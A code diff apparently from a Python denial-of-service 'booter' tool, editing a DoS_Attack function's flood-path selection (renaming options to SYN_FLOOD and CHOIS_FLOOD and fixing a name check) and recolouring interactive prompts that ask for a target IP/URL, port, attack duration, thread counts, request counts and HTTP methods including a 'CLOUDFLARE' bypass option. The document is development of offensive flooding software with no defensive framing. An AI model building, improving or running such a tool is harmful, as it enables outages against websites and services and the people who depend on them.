@@ -40,9 +40,9 @@ def generate_url_path_choice(num):
 def DoS_Attack(ip,host,port,type_attack,id,booter_sent):
     rps = 0
     url_path = ''
-    path_get = ['PyFlood','Chois_Flood']
+    path_get = ['SYN_FLOOD','CHOIS_FLOOD']
     path_get_loader = random.choice((path_get))
-    if path_get_loader == "PyPlood":
+    if path_get_loader == "SYN_FLOOD":
         url_path = generate_url_path_pyflooder(5)
     else:
         url_path = generate_url_path_choice(5)
@@ -108,10 +108,10 @@ host = ""
 ip = ""
 target_loader = input(f"{Fore.LIGHTYELLOW_EX}IP/URL==⟩⟩ {Fore.WHITE} ")
 port_loader = int(input(f"{Fore.YELLOW}PORT==⟩⟩ {Fore.YELLOW} "))
-time_loader = time.time() + int(input(f"{Fore.GREEN}TIME (DEFAULT=200)==⟩⟩ {Fore.GREEN} "))
-spam_loader = int(input(f"{Fore.BLUE}SPAM THREAD (DEFAULT=50 OR 250)==⟩⟩ {Fore.WHITE} "))
-create_thread = int(input(F"{Fore.CYAN}CREATE THREAD (DEFAULT=35)==⟩⟩ {Fore.YELLOW}"))
-booter_sent = int(input(F"{Fore.GREEN}BOOTER SENT (DEFAULT=500)==⟩⟩ {Fore.GREEN} "))
+time_loader = time.time() + int(input(f"{Fore.GREEN}TIME (DEFAULT=200)==⟩⟩ {Fore.WHITE} "))
+spam_loader = int(input(f"{Fore.BLUE}SPAM THREAD (DEFAULT=50 OR 250)==⟩⟩ {Fore.YELLOW} "))
+create_thread = int(input(F"{Fore.CYAN}CREATE THREAD (DEFAULT=35)==⟩⟩ {Fore.WHITE}"))
+booter_sent = int(input(F"{Fore.GREEN}BOOTER SENT (DEFAULT=500)==⟩⟩ {Fore.WHITE} "))
 print(f"{Fore.YELLOW} EXAMPLE HTTP METHODS> CONNECT GET POST HEAD ")
 print(f"{Fore.CYAN}EXAMPLE CUSTOM HTTP METHODS> CLOUDFLARE AGE PYFLOODER GATEWAY")
 methods_loader = input(F"{Fore.LIGHTBLUE_EX}HTTP_METHODS (EXAMPLE=GATEWAY)>")
